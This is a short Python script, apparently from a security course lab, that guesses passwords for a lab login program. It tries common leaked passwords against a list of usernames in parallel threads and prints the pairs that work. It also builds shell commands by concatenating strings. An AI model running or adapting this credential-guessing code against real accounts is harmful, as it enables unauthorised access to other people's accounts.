import time
import os
import threading

if __name__ in '__main__':
    start_time = time.time()
    common_passwords=[i.strip() for i in open('/home/cse/Lab1/PwnedPWs100k.txt')]
    gang_names=[i.strip() for i in open('/home/cse/Lab1/gang.txt')]

    def thread_function(i):
        for j in range(10):
            if os.system('python3 ./Login.pyc'+ ' ' + i + ' ' + common_passwords[j] + " >/dev/null 2>&1") == 0:
                print(i, common_passwords[j], "--- %s seconds ---" % (time.time() - start_time))
                break
    
    threads = list()
    for i in gang_names:
        x = threading.Thread(target=thread_function, args=(i,))
        threads.append(x)
        x.start()

    for index, thread in enumerate(threads):
        thread.join()
        print("--- %s seconds ---" % (time.time() - start_time))









